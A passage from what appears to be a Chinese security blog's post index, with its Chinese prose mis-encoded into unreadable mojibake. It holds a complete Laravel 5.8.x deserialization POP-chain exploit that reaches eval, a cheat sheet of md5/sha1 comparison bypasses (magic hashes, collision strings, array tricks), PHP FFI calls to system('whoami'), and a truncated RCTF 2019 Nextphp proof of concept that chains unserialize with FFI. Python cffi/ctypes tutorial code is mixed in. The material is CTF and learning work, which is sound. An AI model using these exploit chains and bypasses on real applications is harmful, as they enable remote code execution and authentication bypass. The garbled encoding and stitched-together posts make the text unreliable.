ï¼Œä½†æ˜¯$definationè¦æ»¡è¶³ifçš„åˆ¤æ–­ï¼Œè·Ÿè¿›\néœ€è¦é¢å¤–å†æ‰¾ä¸¤ä¸ªç±»ï¼Œç¬¬ä¸€ä¸ªç±»å…·æœ‰codeå±æ€§ï¼Œç¬¬äºŒç±»åˆgetNameå‡½æ•°ï¼Œæ¥ä½œä¸ºç¬¬ä¸€ä¸ªç±»çš„configå±æ€§\nå¯ç”¨çš„ç¬¬ä¸€ä¸ªç±»å°±æ˜¯getClassName()æ‰€åœ¨çš„ç±» vendor/mockery/mockery/library/Mockery/Generator/MockDefinition.php\nç¬¬äºŒä¸ªæ˜¯ vendor/nikic/php-parser/lib/PhpParser/Node/Scalar/MagicConst/Line.php\næ€»ç»“ä»¥ä¸Šçš„è¿‡ç¨‹ï¼Œå†™exp\n\u0026lt;?php namespace PhpParser\\Node\\Scalar\\MagicConst{ class Line {} } namespace Mockery\\Generator{ class MockDefinition { protected $config; protected $code; public function __construct($config, $code) { $this-\u0026gt;config = $config; $this-\u0026gt;code = $code; } } } namespace Mockery\\Loader{ class EvalLoader{} } namespace Illuminate\\Bus{ class Dispatcher { protected $queueResolver; public function __construct($queueResolver) { $this-\u0026gt;queueResolver = $queueResolver; } } } namespace Illuminate\\Foundation\\Console{ class QueuedCommand { public $connection; public function __construct($connection) { $this-\u0026gt;connection = $connection; } } } namespace Illuminate\\Broadcasting{ class PendingBroadcast { protected $events; protected $event; public function __construct($events, $event) { $this-\u0026gt;events = $events; $this-\u0026gt;event = $event; } } } namespace{ $line = new PhpParser\\Node\\Scalar\\MagicConst\\Line(); $mockdefinition = new Mockery\\Generator\\MockDefinition($line,\u0026#39;\u0026lt;?php phpinfo();?\u0026gt;\u0026#39;); $evalloader = new Mockery\\Loader\\EvalLoader(); $dispatcher = new Illuminate\\Bus\\Dispatcher(array($evalloader,\u0026#39;load\u0026#39;)); $queuedcommand = new Illuminate\\Foundation\\Console\\QueuedCommand($mockdefinition); $pendingbroadcast = new Illuminate\\Broadcasting\\PendingBroadcast($dispatcher,$queuedcommand); echo urlencode(serialize($pendingbroadcast)); } ?\u0026gt; æ‰§è¡Œæ•ˆæœï¼ˆç›–äº†ä¸€å±‚laravelæŠ¥é”™çš„åº•è‰²å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ\nè¿™ä¸ªé“¾å­éå¸¸çš„é•¿ï¼Œæ¶‰åŠåˆ°6ä¸ªç±»\npopé“¾æ€æˆ‘ï¼ï¼ï¼çœ‹ä»£ç æœ‰ç§ç›®å®³çš„æ„Ÿè§‰äº†\nä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ Laravel POPé“¾ç®€æ | Laravel5.8.xååºåˆ—åŒ–POPé“¾\n","date":"2021-12-04T14:11:02+08:00","permalink":"https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/","section":"posts","tags":["PHP","unserialize","laravel","gadget"],"title":"Laravel-5.8.xååºåˆ—åŒ–popé“¾å­¦ä¹ "},{"categories":["NOTES\u0026SUMMARY"],"contents":" å†™åœ¨å¼€å¤´ï¼š\nåˆ«çº ç»“\nå·¦ä¾§çš„ç¬¦å·åè½¬\u0026amp;æ ‡é¢˜æ˜¯ä¸­æ–‡å¼•å·\u0026amp;æœ‰äº›ç¬¦å·æ¶ˆå¤±\nçš„é—®é¢˜\næˆ‘ä¹Ÿå¾ˆæ— è¯­\nå¯„ã€‚\nmd5(array()) = md5(NULL) = d41d8cd98f00b204e9800998ecf8427e sha1ç»•è¿‡å’Œmd5ç»•è¿‡æ–¹å¼æ˜¯ä¸€æ ·çš„\nmd5($a)==md5($b) \u0026amp;\u0026amp; $a!=$b æ•°ç»„ç»•è¿‡\n?a[]=1\u0026amp;b[]=2 0eç»•è¿‡\nIHKFRNS -\u0026gt; 0e256160682445802696926137988570 QLTHNDT -\u0026gt; 0e405967825401955372549139051580 QNKCDZO -\u0026gt; 0e830400451993494058024219903391 3908336290 -\u0026gt; 0e807624498959190415881248245271 4011627063 -\u0026gt; 0e485805687034439905938362701775 4775635065 -\u0026gt; 0e998212089946640967599450361168 0e215962017 -\u0026gt; 0e291242476940776845150308577824 aabg7XSs -\u0026gt; 0e087386482136013740957780965295 aabC9RqS -\u0026gt; 0e041022518165728065344349536299 0e251288019 -\u0026gt; 0e874956163641961271069404332409 240610708 -\u0026gt; 0e462097431906509019562988736854 md5ç¢°æ’\na=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%16%B4%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%DC%9F%95ab%D2%09P%A1%5D%12%3B%1ETZ%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29%EF%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%1E%7Ch%B0%96%A7%E5U%EBn1q%CA%D0%8B%C7%1BSP b=%D89%A4%FD%14%EC%0EL%1A%FEG%ED%5B%D0%C0%7D%CAh%164%DFl%08Z%FA%1DA%05i%29%C4%FF%80%11%14%E8jk5%0DK%DAa%FC%2B%5C%A0%95ab%D2%09P%A1%5D%12%3B%1ET%DA%AA%92%16y%29%CC%7DV%3A%FF%B8e%7FK%D6%CD%1D%DF/a%DE%27%29o%08%FC%C0%15%D1%1B%14%C1LYy%B2%F9%88%DF%E2%5B%9E%7D%04c%B1%B0%AFj%9E%7Bh%B0%96%A7%E5U%EBn1q%CA%D0%0B%C7%1BSP md5($a)==md5(md5($b)) \u0026amp;\u0026amp; $a!=$b æ•°ç»„ç»•è¿‡\na=\u0026amp;b[]=1 md5((string)$_GET[\u0026lsquo;a\u0026rsquo;])==md5(md5((string)$_GET[\u0026lsquo;b\u0026rsquo;])) \u0026amp;\u0026amp; $a!=$b 0eç»•è¿‡ï¼Œä¸€ä¸ªæ˜¯æ­£å¸¸0eï¼Œä¸€ä¸ªæ˜¯ç¬¬äºŒæ¬¡md5åè¿˜ä¸º0eçš„å¥‡è‘©å€¼\naawBzC aabsbm9 aaaabGG5T aaaabKGVH md5($a)==md5($b) \u0026amp;\u0026amp; !ctype_alpha($a) \u0026amp;\u0026amp; !is_numeric($b) 0eç»•è¿‡ï¼Œä¸€ä¸ªçº¯æ•°å­—ä¸€ä¸ªçº¯å­—æ¯\n240610708 -\u0026gt; 0e462097431906509019562988736854 QNKCDZO -\u0026gt; 0e830400451993494058024219903391 md5($a)===md5($b) \u0026amp;\u0026amp; $a!=$b æ•°ç»„ç»•è¿‡\n?a[]=1\u0026amp;b[]=2 md5($a)===md5(md5($b)) \u0026amp;\u0026amp; $a!=$b æ•°ç»„ç»•è¿‡\n?a[]=1\u0026amp;b[]=2 md5($a)===md5($b) \u0026amp;\u0026amp; $a!==$b æ•°ç»„ç»•è¿‡\n?a[]=1\u0026amp;b[]=2 $a!=hash(\u0026ldquo;md4\u0026rdquo;,$a) 0eçº¯æ•°å­—ç»•è¿‡\n\u0026lt;?php for ($i = 0; ; $i++) { $r = \u0026#34;0e\u0026#34; . $i; $md4 = hash(\u0026#34;md4\u0026#34;, $r); if (preg_match(\u0026#34;/^0e[0-9]*$/\u0026#34;, $md4)) { echo (\u0026#34;md4åŠ å¯†å‰:\u0026#34;.$r).\u0026#34;\\n\u0026#34;; echo(\u0026#34;md4åŠ å¯†åï¼š\u0026#34;.$md4); break; } } 0e251288019 -\u0026gt; 0e874956163641961271069404332409 md5($a)===md5($b) \u0026amp;\u0026amp; $a!==$b \u0026amp;\u0026amp; strlen($a)\u0026lt;=3 \u0026amp;\u0026amp; strlen($b)\u0026lt;=3 INFè¡¨ç¤ºæ— ç©·å¤§ï¼Œè€ŒNANè¡¨ç¤ºä¸€ä¸ªåœ¨æµ®ç‚¹æ•°è¿ç®—ä¸­æœªå®šä¹‰æˆ–ä¸å¯è¡¨è¿°çš„å€¼ï¼›é™¤äº†ä¸Trueä¹‹å¤–ï¼Œæ‹¿NANä¸å…¶ä»–ä»»ä½•å€¼è¿›è¡Œæ¾æ•£æ¯”è¾ƒæˆ–è€…ä¸¥æ ¼æ¯”è¾ƒè¿”å›ç»“æœéƒ½æ˜¯FALSE å› ä¸ºä»–ä»¬éƒ½æ˜¯ä¸ç¡®å®šçš„å€¼ï¼Œæ‰€ä»¥åœ¨ä¸è‡ªèº«åšæ¯”è¾ƒæ—¶ï¼Œä¼šè¿”å›false\nINFå’ŒNANç»•è¿‡\na=INF\u0026amp;b=INF a=NAN\u0026amp;b=NAN ($this-\u0026gt;syc != $this-\u0026gt;lover) \u0026amp;\u0026amp; (md5($this-\u0026gt;syc) === md5($this-\u0026gt;lover)) \u0026amp;\u0026amp; (sha1($this-\u0026gt;syc)=== sha1($this-\u0026gt;lover)) åšé¢˜é‡åˆ°çš„\nç”¨åŸç”Ÿç±»Errorï¼ˆphp7ï¼‰æˆ–Exceptionï¼ˆphp5 or 7ï¼‰ï¼Œå®ƒæœ‰__toStringæ–¹æ³•ï¼Œè¢«è§¦å‘åä¼šä»¥å­—ç¬¦ä¸²å½¢å¼è¾“å‡ºå½“å‰ä¿å­˜æƒ…å†µï¼ŒåŒ…æ‹¬é”™è¯¯ä¿¡æ¯å’Œå½“å‰æŠ¥é”™çš„è¡Œå·ï¼Œè€Œè·Ÿä¼ å…¥çš„å‚æ•°æ²¡æœ‰å…³ç³»ï¼›æ‰€ä»¥è¯´å¯ä»¥æ„é€ ä¸¤ä¸ªç±»çš„å®ä¾‹ï¼Œå®ƒä»¬è¡Œå·ç›¸åŒï¼ˆè¢«__toStringè°ƒç”¨åè¾“å‡ºä¿¡æ¯ä¸€æ ·ï¼‰ï¼Œä½†æ˜¯æœ¬èº«ä¸ç›¸åŒï¼ˆä¼ å…¥å‚æ•°ä¸ç­‰ï¼‰\n$str = \u0026#34;?\u0026gt;\u0026lt;?=include~\u0026#34;.urldecode(urlencode(~\u0026#39;/flag\u0026#39;)).\u0026#34;?\u0026gt;\u0026#34;;\t// è¿™ä¸ªä¸é‡è¦ æ˜¯é‚£ä¸ªé¢˜çš„payload $a=new Error($str,1);$b=new Error($str,2); $c = new SYCLOVER(); $c-\u0026gt;syc = $a; $c-\u0026gt;lover = $b; æ³¨æ„$aå’Œ$bå†™åˆ°ä¸€è¡Œ\n$this-\u0026gt;token === $this-\u0026gt;token_flag æŒ‡é’ˆå–åœ°å€ç»•è¿‡\n$F-\u0026gt;token=\u0026amp;$F-\u0026gt;token_flag; ","date":"2021-12-03T00:24:56+08:00","permalink":"https://amiaaaz.github.io/2021/12/03/bypass-md5-or-sha1-compare/","section":"posts","tags":["md5"],"title":"md5æ¯”è¾ƒå¸¸è§ç»•è¿‡å°ç»“"},{"categories":["NOTES\u0026SUMMARY"],"contents":"åºŸè¯ä¸å¤šè¯´ï¼Œç›´æ¥è¿›å…¥æ­£é¢˜ï¼›æ–‡ä¸­å‚è€ƒé“¾æ¥ç»Ÿä¸€æ‰”åé¢äº†\nPreloading PHP RFC: Preloading | php7.4å¯ç”¨ é¢„åŠ è½½æ–‡ä»¶åˆ°opcacheä¸­ï¼Œç±»ä¸èƒ½æœ‰ä¸å¯è¾¾çš„çˆ¶ç±»ã€æ¥å£ï¼Œalso only top-level entities are not nested with control structures (e.g. if()\u0026hellip;)may be preloadedï¼›è¢«åŠ è½½åé™¤éé‡å¯ï¼Œè¿›è¡Œçš„ä¿®æ”¹ä¸å½±å“å½“å‰è¿›ç¨‹ï¼›é¢„åŠ è½½ä¸å½±å“é™æ€ç±»æˆå‘˜å’Œå˜é‡çš„è¡¨ç°ï¼›Windowsä¸­ä¸èƒ½é¢„åŠ è½½ä»å†…éƒ¨ç»§æ‰¿çš„ç±»ï¼ˆWindows ASLR and absence of fork() don\u0026rsquo;t allow to guarantee the same addresses of internal classes in different processes.ï¼‰ï¼›å¤šç‰ˆæœ¬æœ‰å¯èƒ½é€ æˆbug\nFFI PHP RFC: FFI - Foreign Function Interface | php7.4å¯ç”¨ æ–‡æ¡£ä¸­ç»™äº†ä¸€ä¸ªå°æ —å­\n\u0026lt;?php // create FFI object, loading libc and exporting function printf() $ffi = FFI::cdef( \u0026#34;int printf(const char *format, ...);\u0026#34;, // this is regular C declaration \u0026#34;libc.so.6\u0026#34;); // call C printf() $ffi-\u0026gt;printf(\u0026#34;Hello %s!\\n\u0026#34;, \u0026#34;world\u0026#34;); ç›´æ¥è¿è¡Œå³å¯è¾“å‡ºHello world!ï¼›è¿™ä¸ªå‡½æ•°çš„åŸå‹æ˜¯è¿™æ ·çš„\nFFI::cdef([string $cdef = \u0026#34;\u0026#34; [, string $lib = null]]): FFI ä¹¦å†™çš„å½¢å¼ç›¸å½“çš„ç®€æ´ï¼Œåˆ›å»ºFFIå¯¹è±¡ï¼ˆå£°æ˜ï¼‰-\u0026gt;è°ƒç”¨cæ–¹æ³•ï¼›è¯•ç€ç›´æ¥æ‰§è¡Œä¸€ä¸ªwhoami\nphp -r \u0026#39;$ffi = FFI::cdef(\u0026#34;int system(char *command);\u0026#34;);$ffi-\u0026gt;system(\u0026#34;whoami\u0026#34;);\u0026#39; å‘ç°åœ¨æ²¡æœ‰ç¬¬äºŒä¸ªå‚æ•°çš„æƒ…å†µä¸‹ä¹Ÿå¯ä»¥æ­£å¸¸æ‰§è¡Œsystemå‡½æ•°ï¼Œçœ‹ä¸‹æºç \nè¿™ç§æƒ…å†µä¸‹lib=NULLï¼Œhandle=RTLD_DEFAULTï¼ˆè¿™ä¸ªæ³¨é‡ŠTODOå°±å¾ˆçµæ€§ï¼‰\néšåè°ƒç”¨DL_FETCH_SYMBOLï¼Œä¹Ÿå°±æ˜¯dlsysm\nRTLD_DEFAULT\nFind the first occurrence of the desired symbol using the default shared object search order. The search will include global symbols in the executable and its dependencies, as well as symbols in shared objects that were dynamically loaded with the RTLD_GLOBALflag.\nå½“dlsymç¬¬ä¸€ä¸ªå‚æ•°ä¸ºRTLD_DEFAULTæ—¶ï¼Œä¼šæŒ‰ç…§é»˜è®¤å…±äº«åº“é¡ºåºæŸ¥æ‰¾systemçš„ä½ç½®ï¼Œæœç´¢èŒƒå›´è¿˜åŒ…æ‹¬äº†å¯æ‰§è¡Œç¨‹åºæå…¶ä¾èµ–ä¸­çš„å‡½æ•°è¡¨ï¼ˆå¦‚æœè®¾ç½®äº† RTLD_GLOBALè¿˜ä¼šæœç´¢åŠ¨æ€åŠ è½½åº“ä¸­çš„å‡½æ•°è¡¨ï¼‰ï¼Œä¹Ÿå°±æ˜¯ç›´æ¥åœ¨å…¨å±€ç¬¦å·è¡¨é‡Œæ‰¾äº†ï¼Œæ‰€ä»¥ä¸éœ€è¦æŒ‡å®šåŠ è½½åº“ï¼Œfopenè¿™ç±»å‡½æ•°ä¹Ÿæ˜¯ä¸€æ ·\næ›´å¤šçš„æ —å­è¯·å‚è§æ–‡æ¡£å’Œè¿™ä¸€ç¯‡æ–‡ç« ï¼Œå†™çš„éƒ½å¾ˆè¯¦ç»†\nè·‘ä¸ªé¢˜ï¼šFFI in Python Pythonçš„ä¼˜ç‚¹å°±ä¸å¿…è¯´äº†ï¼Œç¼ºç‚¹æ˜¯å°è£…å¤ªå¥½äº†å¯¼è‡´è¿è¡Œé€Ÿåº¦ä¸Šä¸å»ï¼Œé‚£ä¸ºä»€ä¹ˆä¸ç›´æ¥åœ¨Pythonä¸­ç”¨C/C++å‘¢ï¼Ÿ\nè‚¥è‚ ä¸é”™çš„æƒ³æ³•ï¼ä¸è¿‡è¦è§£å†³çš„æœ‰ä¸¤ä¸ªé—®é¢˜ï¼šMarshallingï¼ˆæ„Ÿè§‰ç¼–ç»„è¿™ä¸ªç¿»è¯‘å¾ˆå¥‡æ€ª ä½†æ˜¯è¿™ä¸ªè¡Œä¸ºå¯ä»¥ç±»æ¯”ä¸€ä¸‹serializeï¼‰ \u0026amp; Manageing Memoryï¼ˆå†…å­˜ç®¡ç†ï¼‰\nPythonä¸­ä¸‡ç‰©çš†objectï¼Œè€ŒCä¸­æœ‰ä¸¥æ ¼çš„int floatç­‰ç­‰ç±»å‹ Pythonæœ‰gcï¼Œè€ŒCä¸­éœ€è¦æ‰‹åŠ¨malloc ä¸è¿‡ä¸æ€¥ï¼Œå·²ç»æœ‰åº“å°è£…å¥½äº†è¿™äº›åŠŸèƒ½å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œæ¥åº·åº·demo\nctypesåº“ #include \u0026lt;stdio.h\u0026gt; float cadd(int x, float y) { float res = x + y; printf(\u0026#34;In cadd: int %d float %.1f returning %.1f\\n\u0026#34;, x, y, res); return res; } import ctypes import pathlib if __name__ == \u0026#34;__main__\u0026#34;: # load the lib libname = pathlib.Path().absolute() / \u0026#34;libcadd.so\u0026#34; c_lib = ctypes.CDLL(libname) x, y = 6, 2.3 # define the return type c_lib.cadd.restype = ctypes.c_float # call the function with the correct argument types res = c_lib.cadd(x, ctypes.c_float(y)) print(f\u0026#34;In python: int: {x} float {y:.1f} return val {res:.1f}\u0026#34;) $ gcc -shared -Wl,-soname,libcadd -o libcadd.so -fPIC cadd.c $ python3 test.py In cadd: int 6 float 2.3 returning 8.3 In python: int: 6 float 2.3 return val 8.3 å¯ä»¥çœ‹åˆ°æˆåŠŸè°ƒç”¨äº†cadd.soï¼Œè€Œæˆ‘ä»¬åœ¨pythonä¸­è¦åšçš„åªæœ‰åŠ è½½.so-\u0026gt;è®¾ç½®ç¬¦åˆCæ ‡å‡†çš„è¿”å›å€¼ç±»å‹-\u0026gt;è°ƒç”¨ï¼Œè‚¥è‚ çš„ç®€å•\nä¸è¿‡æ ‡å‡†åº“ctypesæœ‰ä¸€äº›ç¼ºé™· å¹¶ä¸”ä¸èƒ½æ‹“å±•å¤§å‹é¡¹ç›®ï¼Œé‰´äºæ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨cffiåº“\ncffiåº“ è¿™é‡Œæ˜¯ä¸€ä¸ªhello worldçš„å°demo\nfrom cffi import FFI ffi = FFI() # å¯ä»¥å®šä¹‰å‡½æ•° ç»“æ„ä½“ å˜é‡ ffi.cdef(\u0026#34;\u0026#34;\u0026#34; int printf(const char *format, ...); \u0026#34;\u0026#34;\u0026#34;) c = ffi.dlopen(None) # åŠ è½½cå‘½åç©ºé—´ arg = ffi.new(\u0026#34;char[]\u0026#34;, b\u0026#34;world\u0026#34;) # å³ char arg[]=\u0026#34;world\u0026#34;; c.printf(b\u0026#34;hello %s\\n\u0026#34;, arg) è¿™ä¸ªæ —å­é‡Œç›´æ¥åœ¨ä¸€ä¸ªpyæ–‡ä»¶ä¸­ç”¨cffiè°ƒç”¨åº“å‡½æ•°å°±ç»“æŸäº†ï¼Œè‚¥è‚ è‚¥è‚ çš„ç®€å•ï¼›æˆ–è€…ä¹Ÿå¯ä»¥å’Œctypesä¸€æ ·ï¼Œå•ç‹¬å†™ä¸€ä¸ªcå…ˆ\n#include \u0026lt;stdio.h\u0026gt; int Tadd(int a, int b){ int c; c = a+b; return c; } void Tprint(void){ printf(\u0026#34;hello, world\\n\u0026#34;); } int Tmul(int a, int b){ return a*b; } ç„¶åè°ƒç”¨ffi.verify()åœ¨Pythonä¸­åŠ è½½å’Œä½¿ç”¨ï¼Œä¸è¿‡è¿˜éœ€è¦é¢å¤–å£°æ˜å‡½æ•°\nfrom cffi import FFI ffi = FFI() ffi.cdef(\u0026#34;\u0026#34;\u0026#34; int Tadd(int a, int b); void Tprint(void); int Tmul(int a, int b); \u0026#34;\u0026#34;\u0026#34;) lib = ffi.verify(sources=[\u0026#39;uu.c\u0026#39;]) print(lib.Tadd(10, 2)) lib.Tprint() print(lib.Tmul(3, 5)) ä»¥ä¸Šæ–¹å¼éƒ½æ˜¯åœ¨çº¿apiæ¨¡å¼ï¼Œcffiè¿˜æ”¯æŒç¦»çº¿apiæ¨¡å¼ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªdemo\nfrom cffi import FFI ffibuilder = FFI() ffibuilder.cdef(\u0026#34;\u0026#34;\u0026#34; double sqrt(double x); \u0026#34;\u0026#34;\u0026#34;) # éœ€è¦çš„å¤´æ–‡ä»¶ ffibuilder.set_source(\u0026#34;_libmath\u0026#34;, \u0026#34;\u0026#34;\u0026#34; #include \u0026lt;math.h\u0026gt; \u0026#34;\u0026#34;\u0026#34;, library_dirs = [], libraries = [\u0026#39;m\u0026#39;] ) ffibuilder.compile(verbose=True) python build_cffi.py from _libmath import lib # ç›´æ¥è°ƒç”¨cå‡½æ•° x = lib.sqrt(4.5) print(F\u0026#34;The square root of 4.5 is {x}.\u0026#34;) python test.py å¯ä»¥çœ‹åˆ°è¿™é‡Œå…ˆç”¨ä¸€ä¸ªpyæ–‡ä»¶è°ƒç”¨.hæ¥ç¼–è¯‘ç”Ÿæˆ.soå’Œ.cï¼Œç„¶ååœ¨å¦ä¸€ä¸ªpyæ–‡ä»¶ä¸­è°ƒç”¨.cå³å¯\næˆ–è€…è¿˜æœ‰ç¬¬ä¸‰ç§æ–¹å¼ï¼Œåœ¨Pythonä¸­ä½¿ç”¨å¤–éƒ¨å·²ç»å®šä¹‰å¥½çš„cåº“å‡½æ•°ï¼›è¿™é‡Œä½¿ç”¨wolever/python-cffi-exampleæ¥æ¼”ç¤ºï¼ˆå°±ä¸å¤åˆ¶ç²˜è´´äº†æ å°±ç²˜å°±ç²˜\né¦–å…ˆæ˜¯ä¸€ä¸ªfnmatch.h\næ³¨æ„7 8 9è¡Œè¦æ”¹ä¸€ä¸‹çš„ï¼Œæ ¹æ®/usr/include/fnmatch.hæ”¹\nè¿™æ˜¯build_fnmatch.pyï¼Œç”¨äºç”Ÿæˆæ¨¡å—åœ¨fnmatch.pyä¸­ä½¿ç”¨\nimport os from cffi import FFI ffi = FFI() ffi.set_source(\u0026#34;cffi_example._fnmatch\u0026#34;, # Since we are calling fnmatch directly no custom source is necessary. We # need to #include \u0026lt;fnmatch.h\u0026gt;, though, because behind the scenes cffi # generates a .c file which contains a Python-friendly wrapper around # ``fnmatch``: # static PyObject * # _cffi_f_fnmatch(PyObject *self, PyObject *args) { # ... setup ... # result = fnmatch(...); # return PyInt_FromLong(result); # } \u0026#34;#include \u0026lt;fnmatch.h\u0026gt;\u0026#34;, # The important thing is to inclue libc in the list of libraries we\u0026#39;re # linking against: libraries=[\u0026#34;c\u0026#34;], ) with open(os.path.join(os.path.dirname(__file__), \u0026#34;fnmatch.h\u0026#34;)) as f: ffi.cdef(f.read()) if __name__ == \u0026#34;__main__\u0026#34;: ffi.compile() ä¸€ä¸ªsetup.py\n#!/usr/bin/env python import os import sys from setuptools import setup, find_packages os.chdir(os.path.dirname(sys.argv[0]) or \u0026#34;.\u0026#34;) setup( name=\u0026#34;cffi-example\u0026#34;, version=\u0026#34;0.1\u0026#34;, classifiers=[ \u0026#34;Development Status :: 4 - Beta\u0026#34;, \u0026#34;Programming Language :: Python :: 2\u0026#34;, \u0026#34;Programming Language :: Python :: 3\u0026#34;, \u0026#34;Programming Language :: Python :: Implementation :: PyPy\u0026#34;, \u0026#34;License :: OSI Approved :: BSD License\u0026#34;, ], packages=find_packages(), install_requires=[\u0026#34;cffi\u0026gt;=1.0.0\u0026#34;], setup_requires=[\u0026#34;cffi\u0026gt;=1.0.0\u0026#34;], cffi_modules=[ \u0026#34;./build_fnmatch.py:ffi\u0026#34;, ], ) æœ€åçš„cffi_modulesæŒ‡å®šäº†éœ€è¦ç”Ÿæˆffiå®ä¾‹çš„æ–‡ä»¶\npyhon setup.py install æ²¡æƒ³åˆ°æ˜¯ä¸ªæŠ¥é”™ï¼Œä»”ç»†çœ‹ä¸€ä¸‹åŸå› ï¼Œè§£å†³æ–¹æ³•æ˜¯æŠŠä¹‹å‰çš„fnmatch.hä¸­çš„åç§»æ¢æˆ16è¿›åˆ¶\nå†æ¬¡æ‰§è¡Œå°±å¥½äº†\nå¯ä»¥çœ‹åˆ°è¿™ç§æ–¹å¼æ¯”ä¹‹å‰ç”Ÿæˆçš„æ–‡ä»¶éƒ½è¦å¤šï¼Œç›¸å½“äºå®‰è£…äº†ä¸€ä¸ªæ¨¡å—\nç„¶åæ˜¯ä¸€ä¸ªtest_fnmatch.pyï¼Œæ³¨æ„è¿™é‡Œç›´æ¥ç”¨ç»™å‡ºçš„æ–‡ä»¶è¿˜æ˜¯ä¼šæŠ¥é”™ï¼ŒæŠŠä¸‹å›¾é«˜äº®çš„åœ°æ–¹æ¢æˆ0x1\nå†æ‰§è¡Œå°±å¥½äº†\ncffiå’Œctypesè¿˜æœ‰å¾ˆå¤šçš„èŠ±æ´»ï¼Œé‰´äºæˆ‘çš„ä»£ç èƒ½åŠ›ä¸€èˆ¬ï¼ˆcå’Œpythonéƒ½æ˜¯å‹‰å¼ºå¤Ÿç”¨çš„æ°´å¹³ï¼‰ï¼Œå°±ä¸ç­é—¨å¼„æ–§äº†ï¼Œæ›´å¤šçš„ä¸œè¥¿è¿˜æ˜¯çœ‹å®˜æ–¹æ–‡æ¡£æ¯”è¾ƒé è°±ï¼ˆé“¾æ¥è´´åœ¨æœ€åäº†\nâ€”â€”â€”â€”ä»€ä¹ˆï¼Ÿä¸ºä»€ä¹ˆFFI in PHPä»‹ç»çš„è¿˜ä¸å¦‚FFI in Pythonçš„å¤šï¼Ÿ\nemmmmm è¿™ä¸ªå˜› æ‰ä¸ä¼šè¯´æ˜¯å› ä¸ºæ‡’å‘¢\nSerializable PHP RFC: New custom object serialization mechanism | php7.4å¯ç”¨ å·²æœ‰çš„ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•æ€»æ˜¯æœ‰å¾ˆå¤šå®‰å…¨é—®é¢˜ï¼Œè¿™ä¸ªæè®®æ–°å¢äº†__serialize()ï¼Œ__unserialize()ï¼Œserialize()ï¼Œunserialize()å’ŒSerializable()\nserialize()æ£€æŸ¥åˆ°__serialize()çš„å­˜åœ¨åå°†åœ¨åºåˆ—åŒ–ä¹‹å‰ä¼˜å…ˆæ‰§è¡Œï¼Œè¿”å›åºåˆ—åŒ–å½¢å¼çš„æ•°ç»„ï¼Œå¦‚æœ‰é”™æŠ›å‡ºTypeErrorï¼›å¦‚æœåŒæ—¶æœ‰__serialize()å’Œ__sleep()ï¼Œåè€…å°†è¢«å¿½ç•¥ï¼›å¦‚æœå¯¹è±¡å®ç°äº†Serializable()æ¥å£ï¼Œæ¥å£çš„serialize()å°†è¢«å¿½ç•¥ï¼Œç±»ä¸­çš„__serialize()å°†è¢«è°ƒç”¨ï¼›ååºåˆ—åŒ–æ—¶è§¦å‘__unserialize()\nâ€”â€”â€”â€”å¥½å‹¾å…«å¤æ‚çš„ï¼Œå»ºè®®ç›´æ¥çœ‹æ–‡æ¡£\n[RCTF 2019]Nextphp \u0026lt;?php final class A implements Serializable { protected $data = [ \u0026#39;ret\u0026#39; =\u0026gt; null, \u0026#39;func\u0026#39; =\u0026gt; \u0026#39;print_r\u0026#39;, \u0026#39;arg\u0026#39; =\u0026gt; \u0026#39;1\u0026#39; ]; private function run () { $this-\u0026gt;data[\u0026#39;ret\u0026#39;] = $this-\u0026gt;data[\u0026#39;func\u0026#39;]($this-\u0026gt;data[\u0026#39;arg\u0026#39;]); } public function __serialize(): array { return $this-\u0026gt;data; } public function __unserialize(array $data) { array_merge($this-\u0026gt;data, $data); $this-\u0026gt;run(); } public function serialize (): string { return serialize($this-\u0026gt;data); } public function unserialize($payload) { $this-\u0026gt;data = unserialize($payload); $this-\u0026gt;run(); } public function __get ($key) { return $this-\u0026gt;data[$key]; } public function __set ($key, $value) { throw new \\Exception(\u0026#39;No implemented\u0026#39;); } public function __construct () { throw new \\Exception(\u0026#39;No implemented\u0026#39;); } } å¦‚æœç†Ÿè¯»ä»¥ä¸Šä¸‰ä¸ªæ–‡æ¡£ï¼Œè¿™ä¸ªé¢˜å°±å¾ˆå¥½å‡ºäº†\næˆ‘ä»¬å¯ä»¥æŠŠfuncè®¾ä¸ºFFI:cdefï¼Œargè®¾ä¸ºint system(char *command)æ¥æ‰§è¡Œcä»£ç ç»•è¿‡php.iniä¸­çš„é™åˆ¶ï¼›åŒæ—¶ç”±äºSerializableçš„ç§ç§æ–°ç‰¹æ€§ï¼ˆå‡ºé¢˜äººä¹Ÿåœ¨è¿™é‡Œè®¾äº†å‘ï¼‰ï¼Œæˆ‘ä»¬åœ¨æ„é€ pocæ—¶è¦åˆ é™¤__serialize()ï¼Œé˜²æ­¢ç›´æ¥returnè¿›å‘é‡Œäº†\n\u0026lt;?php final class A implements Serializable { protected $data = [ \u0026#39;ret\u0026#39; =\u0026gt; null, \u0026#39;func\u0026#39; =\u0026gt; \u0026#39;FFI::cdef\u0026#39;, \u0026#39;arg\u0026#39; =\u0026gt; \u0026#39;int system(char *command);\u0026#39; ]; private function run () { $this-\u0026gt;data[\u0026#39;ret\u0026#39;] = $this-\u0026gt;data[\u0026#39;func\u0026#39;]($this-\u0026gt;data[\u0026#39;arg\u0026#39;]); } public function serialize (): string { return serialize($this-\u0026gt;data); } public function __unserialize(array $data) { array_merge($this-\u0026gt;data, $data); $this-\u0026gt;run(); } public function unserialize($payload) { $this-\u0026gt;data = unserialize($payload); $this-\u0026gt;run(); } public function __get ($key) { return $this-\u0026gt;data[$key]; } public function __set ($key, $value) { throw new \\Exception(\u0026#39;No implemented\u0026#39;); } public function __construct () { echo 